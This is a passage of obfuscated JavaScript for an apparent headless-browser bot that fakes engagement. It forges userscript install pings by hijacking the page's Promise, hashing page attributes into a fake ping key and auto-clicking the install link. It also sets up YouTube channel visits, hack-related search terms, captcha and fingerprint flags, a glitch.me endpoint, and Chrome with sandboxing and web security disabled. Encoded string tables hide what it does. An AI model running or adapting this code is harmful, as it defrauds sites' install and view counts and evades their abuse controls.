                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xa * -0x2e9 + -0x639 + 0x2363; J < -0x2e7 * -0xd + 0x21e7 + -0x4752; ++J)
                K = Q[J - (0x14ae * -0x1 + -0xa * 0x2b9 + 0x2feb)] ^ Q[J - (0x1e75 + 0x2b4 + -0x2121)] ^ Q[J - (-0x1 * 0x1366 + -0x12e7 + -0x265b * -0x1)] ^ Q[J - (0x53 * -0x17 + -0x10d * -0x13 + -0xc72)], Q[J] = K << 0x2566 * 0x1 + 0x24a9 + -0x4a0e | K >>> 0x148d * 0x1 + -0x188 + -0x52 * 0x3b;
              for (J = -0x7f5 * 0x2 + 0x1033 + -0x49; J < 0x5 * 0x30e + -0x283 * 0x1 + -0xcaf; J += -0x912 * 0x2 + -0x1c3 * -0x2 + 0xea3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1f3b + -0x145 * 0x19 + 0xc99 * 0x5 | L >>> 0x638 + 0x1c88 + -0x1 * 0x22a5) + (M & N | ~M & O) + P + (0xc * -0x5760680 + 0xb * -0x4b3fea1 + 0x8f24 * 0x17399) + Q[J] << -0x9 * 0x3d1 + -0x2163 + 0x43bc) << 0x1a * -0xc2 + 0x2433 * 0x1 + -0x107a | P >>> 0x1a3a + -0xa4 * 0x22 + -0x457) + (L & (M = M << -0x1a1d + -0x97 * 0x2f + -0x4 * -0xd7d | M >>> -0xd5b + -0xc54 + 0x19b1) | ~L & N) + O + (-0x5ec1e51 + -0x9be2eda5 + 0xfc51858f) + Q[J + (0x3bd + 0x7ad + -0x17 * 0x7f)] << 0x12d3 + -0xc48 + -0x68b) << 0x487 * -0x3 + 0xd3 * -0x1 + 0xe6d | O >>> 0x438 + -0x4 * -0x473 + 0x15e9 * -0x1) + (P & (L = L << -0x14d * -0xf + -0x17b7 + 0x452 | L >>> -0x945 + 0x3eb * -0x6 + -0x4d * -0x6d) | ~P & M) + N + (0x5a9d19a2 + -0x12190f77 * -0x5 + -0x5a97ed5c) + Q[J + (0x12e0 + -0x1 * -0x979 + -0x1c57)] << 0x279 + -0x629 + 0x8 * 0x76) << 0x1 * 0xb4c + 0xeb7 + -0x1 * 0x19fe | N >>> -0x992 + 0x1008 * -0x2 + 0x29bd) + (O & (P = P << -0x15 * 0x124 + -0xb5a + 0x236c | P >>> -0x397 * 0x6 + 0x4 * 0x81d + -0xae8) | ~O & L) + M + (0x964f5b9 * 0x13 + 0x6efb5660 + 0x56 * -0x25044c3) + Q[J + (-0x5 * -0x35 + 0x124e + -0x1354)] << 0xaaa + 0x1dfe + -0x28a8) << 0x2 * -0xdd5 + 0x22d7 + -0x1ca * 0x4 | M >>> 0x80d * 0x2 + -0x2d6 * -0x1 + -0x12d5) + (N & (O = O << 0x15 * 0xeb + 0x9c9 * -0x1 + -0x50 * 0x1e | O >>> 0x7 * 0x278 + 0x318 + -0x42 * 0x4f) | ~N & P) + L + (-0x1838e5 * -0x4 + -0x49eca5a9 + -0xbb7dfb1 * -0xe) + Q[J + (-0x1606 * 0x1 + -0x4 * -0x4fc + 0x10d * 0x2)] << -0x14ef + -0x21 * 0xe + 0x16bd * 0x1, N = N << 0x1197 + 0x18d2 + -0x2a4b | N >>> 0x4f * 0x31 + -0x2b * 0x9c + 0xb17;
              for (; J < 0x22a6 * -0x1 + 0x1c7 + 0x2107; J += -0x3a6 + 0x224a + -0x1e9f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3d7 * -0x9 + -0x2220 + -0x6a | L >>> 0x1957 + -0x23cf + 0xa93) + (M ^ N ^ O) + P + (-0x8ca5e503 + 0x1129c6 * -0xa13 + 0x1 * 0x1a867a656) + Q[J] << -0xfa8 + 0x1e9 + 0xdbf) << -0x599 * -0x5 + 0x19ef * 0x1 + -0x35e7 | P >>> -0x7 * -0x160 + -0x1 * 0xc42 + 0x2bd) + (L ^ (M = M << -0x1 * -0x12a3 + 0x11a0 + -0x2425 | M >>> -0x1 * -0xb29 + 0x185 * 0x11 + -0x24fc) ^ N) + O + (-0xafb62bc8 + -0x881e39b5 + -0xac22 * -0x2749f) + Q[J + (0x30 * 0xc1 + -0x49a + -0x1f95)] << 0x1174 * 0x1 + -0x2416 * -0x1 + -0xb2 * 0x4d) << 0x1 * 0xa3b + 0x1583 * 0x1 + -0xa93 * 0x3 | O >>> 0x1c72 + -0x175 * 0x5 + -0x150e * 0x1) + (P ^ (L = L << 0x474 * -0x3 + 0xd63 + 0x17 | L >>> -0x1624 + -0x1a50 + 0x183b * 0x2) ^ M) + N + (0x505a057e + -0x1 * -0x60ec8ba3 + 0x609e080 * -0xb) + Q[J + (-0xefa + -0x1 * -0xbeb + -0x5 * -0x9d)] << -0x1524 + -0x1 * 0x16e1 + 0x2c05) << 0xb37 + -0x1728 + -0x5fb * -0x2 | N >>> -0x129a + 0x4c1 + 0xdf4) + (O ^ (P = P << -0x4 * 0x5d5 + 0x2 * -0x691 + -0x925 * -0x4 | P >>> 0x1 * -0x42d + -0x19e * -0xa + -0xbfd) ^ L) + M + (0x1 * 0xbca8116 + 0x76b2de90 + 0x9 * -0x22e9b1d) + Q[J + (0x1d * -0x116 + -0x2036 + 0x3fb7)] << 0x50e + 0x8fd + -0xe0b) << 0x1e86 * -0x1 + 0xd2d * 0x1 + 0x115e | M >>> -0x1 * 0x2681 + 0x1d17 + 0x985) + (N ^ (O = O << 0x1 * 0x2285 + 0x851 * -0x1 + -0x1a16 | O >>> 0x1538 + 0xb4b + -0x2081) ^ P) + L + (-0x456cd411 * -0x3 + 0x3d20a * -0x2a4d + -0x2 * -0x2017a038) + Q[J + (-0x1007 + -0x2433 * 0x1 + 0x343e)] << -0x88 * 0x14 + -0xe41 * -0x1 + 0x1 * -0x3a1, N = N << 0xb * -0xa1 + -0xf7a + -0x3 * -0x781 | N >>> 0x1bb3 + 0x1290 + -0x2e41;
              for (; J < -0x196b + 0x429 + 0x157e; J += 0x18a2 + -0x3da * -0xa + -0x3f21)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x401 + -0x1f5b * -0x1 + -0x1b55 | L >>> -0x50f + 0x493 * -0x7 + 0x252f) + (M & N | M & O | N & O) + P - (-0xe11 * 0xe7290 + 0x61e64c6 * 0x1 + 0x135ff59ee) + Q[J] << 0xb * -0x2d7 + -0xc61 * 0x2 + 0x37ff) << 0x1 * -0xc97 + 0x26a * 0x5 + 0x45 * 0x2 | P >>> -0x1ffa + -0x1727 + -0x7e4 * -0x7) + (L & (M = M << 0xe7b + 0x1f2a * -0x1 + -0x11 * -0xfd | M >>> -0xb53 + 0x2 * -0x373 + -0x167 * -0xd) | L & N | M & N) + O - (-0x9444ef80 + -0xd10cadea + 0x1d635e08e) + Q[J + (0x3a * 0x31 + 0x367 + -0xe80)] << 0x1a94 + 0x2519 + -0x3fad) << -0x47 * -0x6d + -0x1 * 0x175 + -0x1cc1 | O >>> 0x12bd + 0x81 * 0x21 + -0x2343) + (P & (L = L << 0x1 * 0xa7e + -0x9e4 + -0x4 * 0x1f | L >>> -0x45 * -0x9 + 0x101 + -0x2 * 0x1b6) | P & M | L & M) + N - (-0x7a * 0xd47127 + 0x8cd5b96 * 0x9 + 0x3a57564 * 0x25) + Q[J + (-0x1a4d * -0x1 + -0xf44 + -0xb07 * 0x1)] << -0x1 * 0xbc4 + 0x1806 + -0xc42) << 0xd7 * -0xf + 0x191 * -0x7 + 0x1795 | N >>> -0x4 * 0x373 + 0x600 + 0x7e7) + (O & (P = P << 0x1e61 + -0x1e98 + -0x55 * -0x1 | P >>> -0x1cad + 0x8d8 * -0x2 + 0x3 * 0xf75) | O & L | P & L) + M - (-0x1f * -0x2fd5041 + 0x1eab * -0x20778 + 0x5272986d) + Q[J + (-0x149c + 0x1fc2 + 0xb23 * -0x1)] << -0x3a * 0x30 + -0x1 * -0x126d + 0x78d * -0x1) << -0x5 * -0x42 + 0xe9 * 0xe + -0xe03 | M >>> -0x1dfe + 0xe60 + 0xaf * 0x17) + (N & (O = O << -0x1 * 0x1536 + -0x1 * 0x25be + 0x3b12 | O >>> 0x160a + -0x1 * 0x206d + 0x3 * 0x377) | N & P | O & P) + L - (-0x5 * -0x24f024b9 + 0x1a * 0x55f7d93 + 0x1 * -0xd37f3567) + Q[J + (-0x1eb7 + 0x17b9 + -0x4e * -0x17)] << -0x83e + -0x1902 + 0x4 * 0x850, N = N << -0x3 * -0x91a + 0x2423 + 0x2b * -0x179 | N >>> -0x161c + -0x2 * -0x12da + -0xf96;
              for (; J < 0x2ee + 0xc4e + -0x3bb * 0x4; J += -0xed * -0x19 + 0xd * 0xab + -0x1fcf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xfef + -0x110a + 0x4 * 0x48 | L >>> 0x3cd * 0x1 + -0x1b44 + 0x1792) + (M ^ N ^ O) + P - (-0x2836d9ac + 0x2 * 0x1d310943 + 0x23720550) + Q[J] << -0x200 + 0x1054 + -0xe54) << -0x13c3 * -0x1 + 0x105c + 0x120d * -0x2 | P >>> 0x2 * 0x133b + 0x17b * 0xd + -0x1 * 0x399a) + (L ^ (M = M << -0x1 * 0x7c9 + 0xf9c + 0x7b5 * -0x1 | M >>> 0x10e7 + 0x133d + -0x2422) ^ N) + O - (0x3161fe46 * 0x1 + 0xcf23e99 + 0x8b6feb5 * -0x1) + Q[J + (0x176e + 0x2024 + 0xb1d * -0x5)] << -0x4 * 0x97b + -0x7 * 0x3fd + 0x41d7) << 0x268a + 0x2a * -0x93 + -0xe67 | O >>> -0xec1 + 0x2 * -0x115 + 0x1106) + (P ^ (L = L << 0x2 * -0xbdd + 0x1eac + 0x2e * -0x26 | L >>> 0x669 + -0x103e + 0x9d7) ^ M) + N - (-0x16c376 * 0x35b + 0x342db2b2 + 0x3a * 0x15778f9) + Q[J + (-0x2cf + 0xf99 * 0x2 + -0x1c61)] << 0x201b + 0x18a2 + -0x38bd) << 0xd5e + 0x3e8 + 0x1141 * -0x1 | N >>> 0x325 + 0x2a9 * 0xa + 0x769 * -0x4) + (O ^ (P = P << 0x5 * 0x74d + -0x11 * 0x210 + -0x71 * 0x3 | P >>> 0x144d + 0x1cdd + -0x3128) ^ L) + M - (-0x43313f7d + -0x6ae37b43 + -0x26 * -0x5fdf257) + Q[J + (0x313 * 0x2 + -0x1 * 0x36e + -0x2b5)] << 0x156f + 0xea8 + -0x2417) << -0x1f4c * 0x1 + 0x12e0 + 0xc71 | M >>> -0x41b * 0x6 + 0x1 * 0xfdf + 0x46f * 0x2) + (N ^ (O = O << -0x2 * -0x833 + 0xb16 + 0x1f * -0xe2 | O >>> -0x6c4 + 0x1606 + 0x1e8 * -0x8) ^ P) + L - (-0x54911b94 + -0x11a * -0x3ecf84 + 0x1 * 0x44fdc256) + Q[J + (0x1619 + -0x148f * -0x1 + -0x2aa4)] << 0x43 * -0x6d + -0xaa1 + 0x1394 * 0x2, N = N << 0x1d * 0x124 + 0x1 * 0x22c3 + -0x43b9 | N >>> -0x12e9 + -0x5d * -0x53 + -0xb3c;
              this['h0'] = this['h0'] + L << 0x1 * 0x5d + 0x24b0 + -0x54b * 0x7, this['h1'] = this['h1'] + M << 0xf77 + 0x7cc * -0x5 + 0xdf * 0x1b, this['h2'] = this['h2'] + N << 0x7b * -0x29 + 0x193d + -0x58a, this['h3'] = this['h3'] + O << 0x168c + -0x22aa + 0x21 * 0x5e, this['h4'] = this['h4'] + P << 0x3a1 * -0x5 + 0x23b8 + -0x1193;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x427 * 0x4 + -0xa * -0x209 + -0x3 * 0x136 & -0xe7d * 0x1 + 0x51c * -0x2 + -0xc62 * -0x2] + w[J >> -0x1b8a + -0x14ad + 0x304f & -0xfd4 + -0x7a2 * -0x1 + 0x841] + w[J >> -0xa3f + -0x1f3d + 0x2990 & -0x465 + -0x5 * -0x127 + -0x14f] + w[J >> -0x3fb + 0x11e * -0xb + 0x1055 & 0x2115 + -0x296 * -0x1 + -0x239c] + w[J >> 0x1 * -0x602 + 0x457 + 0x1b7 & -0x1590 + -0x259 * 0x9 + 0x4c0 * 0x9] + w[J >> 0xda + -0x1854 + 0x1782 & -0x79e * -0x3 + 0x11e8 + -0x3 * 0xd91] + w[J >> 0x2c3 * -0x1 + 0x34a * -0x1 + -0x1 * -0x611 & 0x757 * 0x2 + 0x1 * -0x1c4f + -0x30 * -0x49] + w[-0x12c0 + -0x145 + 0x1414 & J] + w[K >> 0xea2 * -0x2 + 0x1937 + 0x429 & -0x1871 + -0xcb3 + 0x2533] + w[K >> 0x465 + -0xa75 * 0x2 + 0x109d & -0x74 * 0x10 + 0x4 * 0x167 + 0x3 * 0x91] + w[K >> 0x12b7 + 0xdf * -0x3 + -0x1 * 0x1006 & 0xfd3 + -0xf60 + -0x64] + w[K >> -0x2b * -0x20 + 0xf2 * 0x28 + -0x8a0 * 0x5 & -0x1 * -0xbf5 + 0x1 * -0x6f1 + -0x4f5] + w[K >> -0x9a * 0x2 + 0x1 * -0xe03 + -0xf43 * -0x1 & -0xc * -0x333 + 0x1205 * -0x1 + -0x1450] + w[K >> -0x6c4 * 0x4 + 0x1739 + -0x3df * -0x1 & 0x1baa + 0x15db + -0x3ce * 0xd] + w[K >> -0x59 * -0x3b + 0x1949 + -0x16e4 * 0x2 & 0x4 * 0x8cf + 0xae * 0x13 + -0x3017] + w[-0x1d23 * 0x1 + -0x27 * -0xa7 + 0x3c1 & K] + w[L >> 0x120c + -0x223 * -0x2 + -0x1636 & 0x22 * 0x8 + -0x174f + 0x164e] + w[L >> 0x8ec + -0x549 + 0x1 * -0x38b & -0x266 + 0x9 * 0x412 + -0x222d] + w[L >> 0xe7d * -0x2 + -0x1799 * -0x1 + -0x575 * -0x1 & -0xb62 + 0x17 * -0x108 + 0x2329] + w[L >> 0x1c77 + -0x1 * 0x179b + -0x4cc & -0x26a5 * -0x1 + 0x1 * -0x24fa + -0x19c] + w[L >> 0x11be + -0x262d + 0x147b & -0x4ef * 0x4 + 0x21df + -0xe14] + w[L >> -0x2 * -0x6e6 + 0x9d8 + 0x179c * -0x1 & 0x17bf + -0x205f + -0xf7 * -0x9] + w[L >> -0xc7d + 0xd98 + 0x3 * -0x5d & 0x16e1 + -0x2491 + 0xdbf] + w[0x1 * -0x383 + -0x149e + 0x24 * 0xac & L] + w[M >> -0xb9e + 0x1 * -0xcff + 0x18b9 & 0x1 * 0x6d3 + -0x407 * -0x4 + -0x16e0] + w[M >> -0x13c9 + -0x5b8 + 0x1999 & 0xbc8 + 0xd00 + 0x18b9 * -0x1] + w[M >> -0x1 * 0x52d + -0x2475 + 0x29b6 & 0x7ca * -0x2 + 0x419 * 0x6 + -0x8f3] + w[M >> 0x25fb + 0x61 * 0x38 + 0x1 * -0x3b23 & -0x246f + -0x6f1 * 0x5 + 0x4733] + w[M >> 0x1 * 0xabd + -0x1a0c + 0x1 * 0xf5b & -0x1ee0 + 0x77e + -0x1771 * -0x1] + w[M >> 0xac6 + 0xa36 * 0x1 + -0x14f4 & -0x2455 + -0xba3 * 0x3 + 0x474d] + w[M >> -0x1 * -0x1160 + 0x8bf * -0x1 + -0x3f * 0x23 & 0x6d * 0x25 + -0x1 * -0xf + -0xfc1] + w[0x1526 + -0x2353 + 0xe3c & M] + w[N >> -0x1 * 0x1a58 + -0x174f + -0x1 * -0x31c3 & 0x2304 + -0x2bd * -0x6 + 0x1 * -0x3363] + w[N >> 0x54b + 0x17b8 + -0xb * 0x2a1 & 0x11da + 0x76 * -0x37 + 0x78f] + w[N >> -0x1 * 0x892 + -0x1 * 0x7d7 + 0x107d & 0xc70 + -0x2 * -0x412 + -0x6d7 * 0x3] + w[N >> 0x240 * 0xc + -0x1 * 0xf86 + -0xb6a & -0xa1d + 0x191e + -0xef2] + w[N >> -0x6d * 0x2 + 0x1771 + -0xc7 * 0x1d & 0x1 * 0x1e02 + -0x1f1b + 0x128] + w[N >> -0x20b9 * -0x1 + 0xdba + -0x2e6b * 0x1 & -0x3b9 * 0x4 + 0x3 * 0x751 + -0x100 * 0x7] + w[N >> 0x17 * -0x87 + 0x21f1 + -0x15cc & -0x1 * 0x1691 + -0xe00 + -0x125 * -0x20] + w[0x11c * -0x14 + 0xbc9 + 0xa76 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xa17 + 0x1b77 + -0x1148 & 0xb9b * 0x2 + -0x1 * 0xd3d + 0x1 * -0x8fa,
                J >> 0x14db + -0x511 + 0x2 * -0x7dd & -0x266b * 0x1 + 0xc5c + 0x1b0e,
                J >> 0x17c3 + 0x2 * -0x1120 + 0xa85 & 0x26ad + 0xb * 0x1b7 + 0x19 * -0x243,
                0x955 + 0x62 * 0x1b + 0x5 * -0x3bc & J,
                K >> -0x1727 + 0x17a2 + 0x1 * -0x63 & 0x26b8 + -0x2408 + -0x1b1,
                K >> -0x1 * 0x133 + -0x49 * 0x6d + 0x2058 & 0x2e3 * -0x4 + 0x5 * -0x411 + 0x20e0,
                K >> -0x1 * -0x24b9 + -0x10e * 0x15 + 0x49 * -0x33 & 0xf * 0x190 + -0x11b3 + -0x2 * 0x25f,
                0x470 * 0x3 + 0x1a73 * 0x1 + -0x9b1 * 0x4 & K,
                L >> 0xf8d + 0x31 * -0x5b + 0x1f6 & 0xad + 0x1 * -0x1961 + 0x19b3,
                L >> -0x7b1 * -0x3 + -0x1a9 + -0x155a * 0x1 & -0x832 + 0x147 * 0x16 + -0x67 * 0x2f,
                L >> -0x2 * -0x13d + -0x10 * -0x250 + -0x2772 & 0x1145 * 0x1 + -0x3d6 * -0x5 + -0x1 * 0x2374,
                -0x1ec3 + -0x9c * -0x2c + 0x279 * 0x2 & L,
                M >> 0x1fcc + -0x3 * -0xc3e + 0x1cd * -0x26 & -0x8dd * 0x1 + 0x75 * 0x55 + -0x1 * 0x1cfd,
                M >> 0x10b8 + -0xfa1 * -0x2 + -0x17f5 * 0x2 & 0x1bff + -0x1 * -0x20b3 + -0x3bb3,
                M >> 0x97 * -0x24 + 0x32e * 0x7 + -0xfe * 0x1 & 0x839 + 0x364 + -0x9 * 0x12e,
                0xaa * -0x6 + 0x8a9 * 0x1 + -0x3ae & M,
                N >> 0x393 + 0x181a + -0x1b95 & -0x1 * -0x1be6 + -0x1585 * 0x1 + -0x2 * 0x2b1,
                N >> 0x236f * -0x1 + -0x1fb9 + 0x4338 & 0x2 * 0x12a1 + 0x1f3 + -0x131b * 0x2,
                N >> -0x51 * -0x33 + 0x1 * -0x2433 + 0x1418 & 0x46d + -0x1 * 0x158e + -0xa0 * -0x1d,
                -0x3 * -0x9f + 0x13b9 + -0x1497 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xd4f + -0xa0 * 0x14 + 0x19e3), (K = new DataView(J))['setUint32'](0x21e9 + 0x239e + -0x4587, this['h0']), K['setUint32'](-0x285 + 0x227c + -0x1 * 0x1ff3, this['h1']), K['setUint32'](-0x426 * -0x6 + 0x1f * 0x45 + 0xb * -0x305, this['h2']), K['setUint32'](-0xc1 * 0x15 + 0x1294 + -0x2b3 * 0x1, this['h3']), K['setUint32'](0x20fb + -0x1f0a * 0x1 + -0x1 * 0x1e1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x2 * -0xca3 + 0x581 + -0x1ec7];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2249 + -0x1259 + -0x550 * 0x3;
            J[-0x316 * -0xb + 0x20f3 + -0x42e5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x18 * -0xe5 + 0x1 * -0xc6a + 0x21e2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x506 * 0x5 + -0x1 * -0x1ae3 + -0x1c4), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x212b * -0x1 + 0x4a4 + -0x25ce;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x1da5 + -0x1bf8 + 0x3f * 0x11), Promise['resolve'](0x1fed + 0x190 + 0x10be * -0x2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x91a * -0x2 + -0x14a5 + 0x26d9; j < 0x2477 + 0xf60 + 0x33d6 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x7 * -0x2cf + -0x3 * -0x32 + 0x3253 + (0x120 + 0x127d * -0x1 + 0x1d15) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1376 + -0x1833 + 0x130 * 0x4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2605 + 0x70 * 0x2a + -0x3865 * 0x1);
    let h = e[f];
    if (b['QMxMEG'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x12cb + -0x3 * -0x935 + -0xe2 * 0xa, s, t, u = -0xa01 * -0x3 + -0x13 * -0x151 + -0x3706; t = n['charAt'](u++); ~t && (s = r % (-0x1 * 0xcf2 + -0x1867 + -0x255d * -0x1) ? s * (0x1 * -0xc9a + 0x2498 + 0x7ea * -0x3) + t : t, r++ % (-0x203f + 0x147a + 0xbc9)) ? p += String['fromCharCode'](0x12de * -0x1 + -0x202 * -0x13 + 0x1 * -0x1249 & s >> (-(0x26df + -0x219 * -0xf + 0x2 * -0x232a) * r & -0xd15 + 0x13ec + -0x6d1)) : 0x2 * -0x17f + 0xce1 * 0x1 + -0x1 * 0x9e3) {
          t = o['indexOf'](t);
        }
        for (let v = -0x29 * -0x99 + 0x1115 + -0x2996 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xd03 * -0x3 + -0xc8c + 0x5bd * 0x9))['slice'](-(0x3 * 0x254 + 0x169b * 0x1 + -0x1d95 * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x19bc + 0x1 * 0x10dd + -0x2a99,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * -0x2287 + -0x111c + 0x33a3; u < 0x11 * -0x1d4 + -0x1214 + 0x3228; u++) {
          p[u] = u;
        }
        for (u = -0x3b1 + 0x47 * 0x67 + -0x18e0; u < 0x15ed + 0x1 * 0x6a5 + -0x2 * 0xdc9; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1c4f + -0x98 * -0x33 + -0x17 * 0x281), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1402 * -0x1 + -0x1031 + -0x3d1, q = -0x26 * 0x11 + -0x55 * -0x16 + 0x24 * -0x22;
        for (let v = 0x219f * -0x1 + 0x785 + -0x2 * -0xd0d; v < n['length']; v++) {
          u = (u + (0x489 + -0x450 + 0x8 * -0x7)) % (0x381 + 0x8 * 0x1e5 + -0x11a9), q = (q + p[u]) % (0x39 * -0x6 + -0x1f4c + 0xe * 0x267), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * -0x119 + 0x1582 + -0x1369 * 0x1)]);
        }
        return t;
      };
      b['PjvPBq'] = m, c = arguments, b['QMxMEG'] = !![];
    }
    const j = e[0x17c3 + 0x14e5 + -0x2ca8],
      k = f + j,
      l = c[k];
    return !l ? (b['PVjWSD'] === undefined && (b['PVjWSD'] = !![]), h = b['PjvPBq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bi = [
    'in/never-h',
    'Ahr0Chm6lY9VCa',
    'W6TKzfGWW6RdTcWQyq',
    'bbVdKxxdLCoukCkQEqS',
    'igrPDIa+igrPDG',
    'm0ie8gHS00',
    'W43dV8k6jbG1kMagW40',
    'rces-and-m',
    'rg/scripts',
    'ChrZl2j5lxnPDa',
    'rg/en/scri',
    'W47dIXy9W4qzFgpcTw4',
    'hrldLZtcP3xcRuhdKrW',
    'WOFcVKDbWRddOddcJ8oyWQK',
    'DY55B3v0DwjLlG',
    't3G3tMC1vdDIBq',
    'EWtcNmoJiCoLyCkr',
    'Ahr0Chm6lY93DW',
    'melih193/r',
    'vCoZsGy5rHi9WRKT',
    '\x20Chrome/10'
  ];
  a = function() {
    return bi;
  };
  return a();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2605 + 0x70 * 0x2a + -0x3865 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + U(0xe) + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    U(0x11) + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xa51 + 0x1351 + -0xed1 * 0x2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + V(0x2, 'RyeF') + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + 